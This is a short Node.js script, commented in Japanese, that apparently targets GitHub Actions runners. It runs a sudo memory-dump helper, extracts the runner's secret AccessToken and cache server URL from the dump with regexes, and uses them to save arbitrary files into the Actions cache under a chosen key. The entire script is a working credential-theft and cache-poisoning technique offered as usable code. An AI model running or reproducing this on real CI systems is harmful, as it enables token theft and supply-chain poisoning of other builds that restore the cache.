
import { execSync } from 'child_process';

const memtext = execSync("sudo python3 mem.py", { encoding: "utf8" });
const url = memtext.match(/CacheServerUrl"\s*:\s*"([^"]+)"/)?.[1];
const token = memtext.match(/AccessToken"\s*:\s*"([^"]+)"/)?.[1];

process.env.ACTIONS_RUNTIME_TOKEN = token;
process.env.ACTIONS_RESULTS_URL = url;
process.env.ACTIONS_CACHE_SERVICE_V2 = true;

console.log(process.env.ACTIONS_CACHE_SERVICE_V2, process.env.ACTIONS_RESULTS_URL, !!process.env.ACTIONS_RUNTIME_TOKEN);

import * as cache from '@actions/cache';
import * as core from '@actions/core';


async function run() {
  try {
    // 1. キャッシュしたいディレクトリやファイルのパス
    const paths = [
      'test'
    ];

    // 2. キャッシュを一意に識別するキー
    const key = `tmpkey`;

    console.log(`Saving cache with key: ${key}...`);

    // 3. キャッシュの保存を実行
    const cacheId = await cache.saveCache(paths, key);

    if (cacheId !== -1) {
      console.log(`Cache saved successfully! (ID: ${cacheId})`);
    } else {
      console.log('Cache was not saved (already exists or unavailable).');
    }
  } catch (error) {
    // 失敗してもワークフローを止めない場合は warning に留める
    core.warning(`Failed to save cache: ${error.message}`);
  }
}

run()